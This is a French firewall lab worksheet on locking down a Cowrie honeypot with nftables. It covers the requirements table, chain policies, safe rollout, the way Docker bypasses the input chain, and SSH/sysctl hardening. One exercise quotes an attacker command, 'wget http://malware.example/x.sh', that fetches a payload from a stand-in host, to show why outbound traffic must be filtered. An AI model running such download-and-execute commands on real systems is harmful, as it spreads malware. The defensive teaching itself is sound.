# TP 1 — Pare-feu d'un honeypot Cowrie (nftables)

> Version complète avec mise en page : [pdf/TP-parefeu-cowrie.pdf](../pdf/TP-parefeu-cowrie.pdf).
> Ma copie annotée et sa correction : [03-correction-tp1.md](03-correction-tp1.md).

**Format :** je fais toutes les manipulations. Chaque exercice donne un objectif, des indices et une méthode de vérification.

## 0. Le paysage des outils

Sur Ubuntu 24.04 il n'y a qu'un moteur de filtrage dans le noyau : `nf_tables`.

| Outil | C'est quoi | À utiliser ? |
|---|---|---|
| `nft` | outil natif | **oui** |
| `iptables` | traducteur vers nf_tables (`iptables v1.8.10 (nf_tables)`) | seulement parce que Docker l'utilise |
| `iptables-legacy` | l'ancien moteur x_tables — règles invisibles depuis nft | **non** |
| `ufw` | sur-couche générant des règles iptables | non : conflits avec Docker |

**Exo 0.1** — `sudo iptables -L -n`, `sudo nft list ruleset`, `sudo iptables-legacy -L -n`. Pourquoi des règles dans le troisième seraient dangereuses ?

## 1. Cahier des charges (avant toute règle)

**Entrant (chaîne input)**

| Qui | Port | Pourquoi | Décision |
|---|---|---|---|
| 192.168.1.33 (PC admin) | tcp/2727 | SSH | ACCEPT |
| Internet via la box | tcp/22, 23 | Cowrie | ACCEPT — géré par Docker (§4) |
| tout le reste | * | | DROP |

**Sortant (chaîne output)**

| Vers | Port | Pourquoi | Décision |
|---|---|---|---|
| VM ELK `192.168.1.___` | tcp/`____` (5044 Logstash ? 9200 Elasticsearch ?) | logs | ACCEPT |
| DNS | udp+tcp/53 | résolution | ACCEPT — vers quel serveur ? |
| Internet | tcp/80, 443 | apt, docker pull | permanent ou « mode maintenance » ? |
| NTP | udp/123 | horloge (logs horodatés) | ACCEPT |
| reste du LAN | * | un honeypot compromis ne doit pas scanner les autres VM | DROP |

**Exo 1.1** — IP/port de l'ELK ? Comment les attaquants atteignent Cowrie ? Sortie Internet permanente ou à la demande ?

**Exo 1.2 (piège)** — Un honeypot doit-il pouvoir sortir sur Internet ? Que se passe-t-il si un attaquant lance `wget http://malware.example/x.sh` dans Cowrie ?

## 2. Concepts nftables

```
table inet filter {                  # inet = IPv4 + IPv6
    chain input {
        type filter hook input priority 0; policy drop;
        ct state established,related accept
        iif lo accept
    }
}
```

- `hook input` = pour la machine ; `hook output` = émis par la machine ; `hook forward` = traverse la machine (Docker !).
- `policy drop` = verdict par défaut si rien n'a matché.
- `ct state` = suivi de connexion : on autorise l'ouverture, les réponses passent via `established,related`.

**Exo 2.1** — Sans l'appliquer, trouver le bug qui fait perdre la machine :

```
table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;
        iif lo accept
        tcp dport 2727 ip saddr 192.168.1.33 accept
        ct state established,related accept
    }
    chain output {
        type filter hook output priority 0; policy drop;
        oif lo accept
        ip daddr 192.168.1.50 tcp dport 5044 accept
    }
}
```

## 3. Mise en place sans se couper la branche

**Règle d'or :** second terminal SSH ouvert + filet de sécurité.

**Exo 3.1** — `sudo bash -c 'sleep 120 && nft flush ruleset' &` — expliquer ; pourquoi `bash -c` ; alternative `systemd-run --on-active=120`.

**Exo 3.2** — Écrire `/etc/nftables.conf`. Contraintes : `policy drop` sur input **et** output ; `lo` dans les deux sens ; `ct state invalid drop` en premier puis `established,related` ; ICMP/ICMPv6 ; SSH 2727 uniquement depuis `$ADMIN_IP` ; sorties ELK/DNS/NTP ; une règle `log prefix "OUT-DROP " limit rate 5/minute` avant le drop implicite.

```bash
sudo nft -c -f /etc/nftables.conf   # vérifier sans appliquer
sudo nft -f /etc/nftables.conf
```

**Exo 3.3** — Tests : `getent`, `curl`, `nc -zv <ELK> <port>` (doit passer), `nc -zv <autre VM> 22` (doit échouer + OUT-DROP), `nmap -p 2727,22,23` depuis le PC puis depuis une autre VM. Puis `systemctl enable --now nftables` et reboot.

## 4. Docker : le piège principal

Docker écrit ses propres règles. Un `-p 2222:2222` ouvre le port à tout le monde en contournant `input` (le trafic passe par `nat prerouting → forward`). Le trafic sortant des conteneurs passe par `forward`, pas `output`.

**Exo 4.1** — Installer Docker, `docker run -d -p 8080:80 nginx`, `nft list ruleset` : compter les tables ; `curl 192.168.1.63:8080` depuis le PC passe malgré `policy drop`. Expliquer.

**Exo 4.2** — Chaîne `DOCKER-USER` : autoriser `established`, l'entrée vers Cowrie, la sortie conteneur → ELK seulement, bloquer le reste du LAN. Persistance ?

**Exo 4.3 (bonus)** — `"iptables": false` dans `daemon.json`.

## 5. Durcissement

SSH (`AllowUsers`, `MaxAuthTries 3`, pas de forwarding) · fail2ban (`jail.local`, port 2727, `ignoreip`) · sysctl (`rp_filter`, `accept_redirects=0`, `send_redirects=0`, `tcp_syncookies`, `log_martians`) · unattended-upgrades vs sortie fermée · netplan (`chmod 600`, corriger `gateway4`) · lynis avant/après.

## Livrables

1. Cahier des charges rempli + réponses 1.2 et 2.1.
2. `/etc/nftables.conf` + sorties nmap.
3. Règles DOCKER-USER + chemin du paquet.
4. Score lynis avant/après.
